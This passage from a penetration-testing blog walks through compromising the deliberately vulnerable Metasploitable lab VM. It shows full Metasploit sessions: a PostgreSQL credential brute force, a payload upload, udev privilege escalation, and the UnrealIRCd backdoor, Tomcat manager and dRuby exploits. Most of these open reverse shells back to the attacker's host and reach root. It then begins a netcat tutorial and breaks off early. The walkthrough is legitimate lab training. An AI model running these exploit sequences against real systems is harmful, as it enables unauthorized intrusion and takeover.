<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/scanner/postgres/postgres_login
</span><span class='line'>msf auxiliary(postgres_login) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (auxiliary/scanner/postgres/postgres_login):
</span><span class='line'>
</span><span class='line'>   Name              Current Setting                                                             Required  Description
</span><span class='line'>   ----              ---------------                                                             --------  -----------
</span><span class='line'>   BLANK_PASSWORDS   false                                                                       no        Try blank passwords for all users
</span><span class='line'>   BRUTEFORCE_SPEED  5                                                                           yes       How fast to bruteforce, from 0 to 5
</span><span class='line'>   DATABASE          template1                                                                   yes       The database to authenticate against
</span><span class='line'>   DB_ALL_CREDS      false                                                                       no        Try each user/password couple stored in the current database
</span><span class='line'>   DB_ALL_PASS       false                                                                       no        Add all passwords in the current database to the list
</span><span class='line'>   DB_ALL_USERS      false                                                                       no        Add all users in the current database to the list
</span><span class='line'>   PASSWORD                                                                                      no        A specific password to authenticate with
</span><span class='line'>   PASS_FILE         /opt/metasploit/apps/pro/msf3/data/wordlists/postgres_default_pass.txt      no        File containing passwords, one per line
</span><span class='line'>   RETURN_ROWSET     true                                                                        no        Set to true to see query result sets
</span><span class='line'>   RHOSTS                                                                                        yes       The target address range or CIDR identifier
</span><span class='line'>   RPORT             5432                                                                        yes       The target port
</span><span class='line'>   STOP_ON_SUCCESS   false                                                                       yes       Stop guessing when a credential works for a host
</span><span class='line'>   THREADS           1                                                                           yes       The number of concurrent threads
</span><span class='line'>   USERNAME          postgres                                                                    no        A specific username to authenticate as
</span><span class='line'>   USERPASS_FILE     /opt/metasploit/apps/pro/msf3/data/wordlists/postgres_default_userpass.txt  no        File containing (space-seperated) users and passwords, one pair per line
</span><span class='line'>   USER_AS_PASS      false                                                                       no        Try the username as the password for all users
</span><span class='line'>   USER_FILE         /opt/metasploit/apps/pro/msf3/data/wordlists/postgres_default_user.txt      no        File containing users, one per line
</span><span class='line'>   VERBOSE           true                                                                        yes       Whether to print output for all attempts
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf auxiliary(postgres_login) &gt; set RHOSTS 192.168.127.154
</span><span class='line'>RHOSTS =&gt; 192.168.127.154
</span><span class='line'>msf auxiliary(postgres_login) &gt; set STOP_ON_SUCCESS true
</span><span class='line'>STOP_ON_SUCCESS =&gt; true
</span><span class='line'>msf auxiliary(postgres_login) &gt; run
</span><span class='line'>
</span><span class='line'>[*] 192.168.127.154:5432 Postgres - [01/20] - Trying username:'postgres' with password:'postgres' on database 'template1'
</span><span class='line'>[+] 192.168.127.154:5432 Postgres - Logged in to 'template1' with 'postgres':'postgres'
</span><span class='line'>[+] 192.168.127.154:5432 Postgres - Success: postgres:postgres (Database 'template1' succeeded.)
</span><span class='line'>[*] 192.168.127.154:5432 Postgres - Disconnected
</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>


<p>So it&rsquo;s possible to log in to this database like earlier with mysql, but I searched through Metasploit&rsquo;s available exploits, and I stumbled upon one that can further the exploitation:</p>

<p><strong>PostgreSQL for Linux Payload Execution</strong></p>

<blockquote><p>On some default Linux installations of PostgreSQL, the postgres service account may write to the /tmp directory, and may source UDF Shared Libraries&rsquo;s
om there as well, allowing execution of arbitrary code. This module compiles a Linux shared object file, uploads it to the target host via the UPDATE
pg_largeobject method of binary injection, and creates a UDF (user defined function) from that shared object. Because the payload is run as the shared
object&rsquo;s constructor, it does not need to conform to specific Postgres API versions.</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/linux/postgres/postgres_payload
</span><span class='line'>msf exploit(postgres_payload) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/linux/postgres/postgres_payload):
</span><span class='line'>
</span><span class='line'>   Name      Current Setting  Required  Description
</span><span class='line'>   ----      ---------------  --------  -----------
</span><span class='line'>   DATABASE  template1        yes       The database to authenticate against
</span><span class='line'>   PASSWORD                   no        The password for the specified username. Leave blank for a random password.
</span><span class='line'>   RHOST                      yes       The target address
</span><span class='line'>   RPORT     5432             yes       The target port
</span><span class='line'>   USERNAME  postgres         yes       The username to authenticate as
</span><span class='line'>   VERBOSE   false            no        Enable verbose output
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Linux x86
</span><span class='line'>
</span><span class='line'>msf exploit(postgres_payload) &gt; set payload linux/x86/meterpreter/reverse_tcp
</span><span class='line'>payload =&gt; linux/x86/meterpreter/reverse_tcp
</span><span class='line'>msf exploit(postgres_payload) &gt; set LHOST 192.168.127.159
</span><span class='line'>LHOST =&gt; 192.168.127.159
</span><span class='line'>set PASSWORD postgres
</span><span class='line'>PASSWORD =&gt; postgres
</span><span class='line'>msf exploit(postgres_payload) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse handler on 192.168.127.159:4444 
</span><span class='line'>[*] 192.168.127.154:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
</span><span class='line'>[*] Uploaded as /tmp/uVhDfWDg.so, should be cleaned up automatically
</span><span class='line'>[*] Transmitting intermediate stager for over-sized stage...(100 bytes)
</span><span class='line'>[*] Sending stage (1228800 bytes) to 192.168.127.154
</span><span class='line'>[*] Meterpreter session 1 opened (192.168.127.159:4444 -&gt; 192.168.127.154:37141) at 2014-06-06 22:49:17 +0300</span></code></pre></td></tr></table></div></figure>


<p>From here we again have to elevate our privileges. I will exploit the same vulnerability with the udev exploit, but this time from inside Metasploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; background
</span><span class='line'>[*] Backgrounding session 1...
</span><span class='line'>msf exploit(postgres_payload) &gt; use exploit/linux/local/udev_netlink
</span><span class='line'>msf exploit(udev_netlink) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/linux/local/udev_netlink):
</span><span class='line'>
</span><span class='line'>   Name         Current Setting  Required  Description
</span><span class='line'>   ----         ---------------  --------  -----------
</span><span class='line'>   NetlinkPID                    no        Usually udevd pid-1.  Meterpreter sessions will autodetect
</span><span class='line'>   SESSION                       yes       The session to run this module on.
</span><span class='line'>   WritableDir  /tmp             yes       A directory where we can write files (must not be mounted noexec)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Linux x86
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(udev_netlink) &gt; set SESSION 1
</span><span class='line'>SESSION =&gt; 1
</span><span class='line'>msf exploit(udev_netlink) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse handler on 192.168.127.159:4444 
</span><span class='line'>[*] Attempting to autodetect netlink pid...
</span><span class='line'>[*] Meterpreter session, using get_processes to find netlink pid
</span><span class='line'>[*] udev pid: 2770
</span><span class='line'>[+] Found netlink pid: 2769
</span><span class='line'>[*] Writing payload executable (274 bytes) to /tmp/rzIcSWveTb
</span><span class='line'>[*] Writing exploit executable (1879 bytes) to /tmp/DQDnKUFLzR
</span><span class='line'>[*] chmod'ing and running it...
</span><span class='line'>[*] Command shell session 2 opened (192.168.127.159:4444 -&gt; 192.168.127.154:33383) at 2014-06-06 23:03:13 +0300
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>So, the same exploit that I manually used earlier was very easy and quick in Metasploit. Onwards!</p>

<h3>Port 5900 vnc</h3>

<p>The Nessus scan reported that the server is using the password &lsquo;password&rsquo;. So I will use vncviewer to connect to it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vncviewer 192.168.127.154
</span><span class='line'>Connected to RFB server, using protocol version 3.3
</span><span class='line'>Performing standard VNC authentication
</span><span class='line'>Password: 
</span><span class='line'>Authentication successful
</span><span class='line'>Desktop name "root's X desktop (metasploitable:0)"
</span><span class='line'>VNC server default format:
</span><span class='line'>  32 bits per pixel.
</span><span class='line'>  Least significant byte first in each pixel.
</span><span class='line'>  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
</span><span class='line'>Using default colormap which is TrueColor.  Pixel format:
</span><span class='line'>  32 bits per pixel.
</span><span class='line'>  Least significant byte first in each pixel.
</span><span class='line'>  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/vnc.png" title="vnc shell" alt="vnc"></p>

<p>And we have another root shell.</p>

<h3>Port 6667 irc</h3>

<p>An exploit is available for this:</p>

<p><strong>UnrealIRCD 3.2.8.1 Backdoor Command Execution</strong></p>

<blockquote><p>This module exploits a malicious backdoor that was added to the Unreal IRCD 3.2.8.1 download archive. This backdoor was present in the Unreal3.2.8.1.tar.gz
archive between November 2009 and June 12th 2010.</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/unix/irc/unreal_ircd_3281_backdoor
</span><span class='line'>msf exploit(unreal_ircd_3281_backdoor) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST                   yes       The target address
</span><span class='line'>   RPORT  6667             yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic Target
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(unreal_ircd_3281_backdoor) &gt; set RHOST 192.168.127.154
</span><span class='line'>RHOST =&gt; 192.168.127.154
</span><span class='line'>msf exploit(unreal_ircd_3281_backdoor) &gt; set payload cmd/unix/reverse 
</span><span class='line'>payload =&gt; cmd/unix/reverse
</span><span class='line'>msf exploit(unreal_ircd_3281_backdoor) &gt; set LHOST 192.168.127.159
</span><span class='line'>LHOST =&gt; 192.168.127.159
</span><span class='line'>msf exploit(unreal_ircd_3281_backdoor) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse double handler
</span><span class='line'>[*] Connected to 192.168.127.154:6667...
</span><span class='line'>    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
</span><span class='line'>    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
</span><span class='line'>[*] Sending backdoor command...
</span><span class='line'>[*] Accepted the first client connection...
</span><span class='line'>[*] Accepted the second client connection...
</span><span class='line'>[*] Command: echo qcHh6jsH8rZghWdi;
</span><span class='line'>[*] Writing to socket A
</span><span class='line'>[*] Writing to socket B
</span><span class='line'>[*] Reading from sockets...
</span><span class='line'>[*] Reading from socket B
</span><span class='line'>[*] B: "qcHh6jsH8rZghWdi\r\n"
</span><span class='line'>[*] Matching...
</span><span class='line'>[*] A is input...
</span><span class='line'>[*] Command shell session 3 opened (192.168.127.159:4444 -&gt; 192.168.127.154:41975) at 2014-06-06 23:31:44 +0300
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<h3>Port 8180 tomcat</h3>

<p>First, let&rsquo;s see what information we can get using the <strong>Tomcat Administration Tool Default Access</strong> module:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use auxiliary/admin/http/tomcat_administration
</span><span class='line'>msf auxiliary(tomcat_administration) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (auxiliary/admin/http/tomcat_administration):
</span><span class='line'>
</span><span class='line'>   Name         Current Setting  Required  Description
</span><span class='line'>   ----         ---------------  --------  -----------
</span><span class='line'>   Proxies                       no        Use a proxy chain
</span><span class='line'>   RHOSTS                        yes       The target address range or CIDR identifier
</span><span class='line'>   RPORT        8180             yes       The target port
</span><span class='line'>   THREADS      1                yes       The number of concurrent threads
</span><span class='line'>   TOMCAT_PASS                   no        The password for the specified username
</span><span class='line'>   TOMCAT_USER                   no        The username to authenticate as
</span><span class='line'>   VHOST                         no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>msf auxiliary(tomcat_administration) &gt; set RHOSTS 192.168.127.154
</span><span class='line'>RHOSTS =&gt; 192.168.127.154
</span><span class='line'>msf auxiliary(tomcat_administration) &gt; run
</span><span class='line'>
</span><span class='line'>[*] http://192.168.127.154:8180/admin [Apache-Coyote/1.1] [Apache Tomcat/5.5] [Tomcat Server Administration] [tomcat/tomcat]
</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>


<p>With credentials in hand, now we can use the <strong>Apache Tomcat Manager Application Deployer Authenticated Code Execution</strong> exploit:</p>

<blockquote><p>This module can be used to execute a payload on Apache Tomcat servers that have an exposed &ldquo;manager&rdquo; application. The payload is uploaded as a WAR archive
containing a jsp application using a PUT request. The manager application can also be abused using /manager/html/upload, but that method is not implemented in > this module. NOTE: The compatible payload sets vary based on the selected target. For example, you must select the Windows target to use native Windows
payloads.</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/http/tomcat_mgr_deploy
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/http/tomcat_mgr_deploy):
</span><span class='line'>
</span><span class='line'>   Name      Current Setting  Required  Description
</span><span class='line'>   ----      ---------------  --------  -----------
</span><span class='line'>   PASSWORD                   no        The password for the specified username
</span><span class='line'>   PATH      /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)
</span><span class='line'>   Proxies                    no        Use a proxy chain
</span><span class='line'>   RHOST                      yes       The target address
</span><span class='line'>   RPORT     80               yes       The target port
</span><span class='line'>   USERNAME                   no        The username to authenticate as
</span><span class='line'>   VHOST                      no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set PASSWORD tomcat
</span><span class='line'>PASSWORD =&gt; tomcat
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set RHOST 192.168.127.154
</span><span class='line'>RHOST =&gt; 192.168.127.154
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set USERNAME tomcat
</span><span class='line'>USERNAME =&gt; tomcat
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set PASSWORD tomcat
</span><span class='line'>PASSWORD =&gt; tomcat
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set RHOST 192.168.127.154
</span><span class='line'>RHOST =&gt; 192.168.127.154
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set USERNAME tomcat
</span><span class='line'>USERNAME =&gt; tomcat
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set RPORT 8180
</span><span class='line'>RPORT =&gt; 8180
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set payload  java/meterpreter/reverse_tcp
</span><span class='line'>payload =&gt; java/meterpreter/reverse_tcp
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; set LHOST 192.168.127.159
</span><span class='line'>LHOST =&gt; 192.168.127.159
</span><span class='line'>msf exploit(tomcat_mgr_deploy) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse handler on 192.168.127.159:8888 
</span><span class='line'>[*] Attempting to automatically select a target...
</span><span class='line'>[*] Automatically selected target "Linux x86"
</span><span class='line'>[*] Uploading 13833 bytes as RuoE02Uo7DeSsaVp7nmb79cq.war ...
</span><span class='line'>[*] Executing /RuoE02Uo7DeSsaVp7nmb79cq/19CS3RJj.jsp...
</span><span class='line'>[*] Undeploying RuoE02Uo7DeSsaVp7nmb79cq ...
</span><span class='line'>[*] Command shell session 4 opened (192.168.127.159:8888 -&gt; 192.168.127.154:33966) at 2014-06-06 23:51:01 +0300
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>tomcat55</span></code></pre></td></tr></table></div></figure>


<p>We can elevate our privileges using the udev exploit from earlier, so I won&rsquo;t go over it again.</p>

<h3>Port 8787 drb</h3>

<p>First I wanted to know what this drb is, since I wasn&rsquo;t familiar with it.</p>

<blockquote><p>Distributed Ruby or DRb allows Ruby programs to communicate with each other on the same machine or over a network. DRb uses remote method
invocation (RMI) to pass commands and data between processes (Wikipedia)</p></blockquote>

<p>Then I searched in Metasploit for an exploit, and luckily, I got a hit:</p>

<p><strong>Distributed Ruby Send instance_eval/syscall Code Execution</strong></p>

<blockquote><p>This module exploits remote code execution vulnerabilities in dRuby</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/linux/misc/drb_remote_codeexec
</span><span class='line'>msf exploit(drb_remote_codeexec) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/linux/misc/drb_remote_codeexec):
</span><span class='line'>
</span><span class='line'>   Name  Current Setting  Required  Description
</span><span class='line'>   ----  ---------------  --------  -----------
</span><span class='line'>   URI                    yes       The dRuby URI of the target host (druby://host:port)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(drb_remote_codeexec) &gt; set URI druby://192.168.127.154:8787
</span><span class='line'>URI =&gt; druby://192.168.127.154:8787
</span><span class='line'>
</span><span class='line'>msf exploit(drb_remote_codeexec) &gt; set payload cmd/unix/reverse
</span><span class='line'>payload =&gt; cmd/unix/reverse
</span><span class='line'>msf exploit(drb_remote_codeexec) &gt; set LHOST 192.168.127.159
</span><span class='line'>LHOST =&gt; 192.168.127.159
</span><span class='line'>msf exploit(drb_remote_codeexec) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse double handler
</span><span class='line'>[*] trying to exploit instance_eval
</span><span class='line'>[*] instance eval failed, trying to exploit syscall
</span><span class='line'>[-] Exploit failed: Errno::EINVAL Invalid argument
</span><span class='line'>[*] Accepted the first client connection...
</span><span class='line'>[*] Accepted the second client connection...
</span><span class='line'>[*] Command: echo 7Kx3j4QvoI7LOU5z;
</span><span class='line'>[*] Writing to socket A
</span><span class='line'>[*] Writing to socket B
</span><span class='line'>[*] Reading from sockets...
</span><span class='line'>[*] Reading from socket B
</span><span class='line'>[*] B: "7Kx3j4QvoI7LOU5z\r\n"
</span><span class='line'>[*] Matching...
</span><span class='line'>[*] A is input...
</span><span class='line'>[*] Command shell session 1 opened (192.168.127.159:4444 -&gt; 192.168.127.154:35889) at 2014-06-08 16:51:56 +0300
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>Another port, another shell!</p>

<p>This turned out to be a a very lengthy post. There were some ports I couldn&rsquo;t find an exploit for, so can&rsquo;t determine if the underlying services were exploitable or not. Overall, owning Metasploitable in multiple ways and documenting it was the goal of this post.</p>

<p>Today&rsquo;s cookie:</p>

<blockquote><p>You will be a winner today.  Pick a fight with a four-year-old.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Network tools - Netcat]]></title>
    <link href="http://chousensha.github.io/blog/2014/05/31/network-tools-netcat/"/>
    <updated>2014-05-31T00:20:29+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/05/31/network-tools-netcat</id>
    <content type="html"><![CDATA[<p>In this tutorial I will cover some of the uses of netcat, known as the &ldquo;TCP/IP Swiss army knife&rdquo;. Netcat is a very powerful and versatile tool that can be used in diagnosing network problems or in penetration testing.</p>

<!-- more -->


<p>There are many netcat variations, some are more recent and have been rewritten to include more features. Let&rsquo;s look at the original netcat man page:</p>

<blockquote><p>netcat is a simple unix utility which reads and writes data across net-
work connections, using TCP or UDP protocol. It is  designed  to  be  a
reliable  &ldquo;back-end&rdquo; tool that can be used directly or easily driven by
other programs and scripts.  At the same time,  it  is  a  feature-rich
network  debugging and exploration tool, since it can create almost any
kind of connection you would need and has several interesting  built-in
capabilities.</p></blockquote>

<p>Ok, so let&rsquo;s see some of the many ways we can use netcat.</p>

<h3>Banner grabbing</h3>

<p>First, let&rsquo;s see what we can glean from using netcat to connect to an FTP server:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
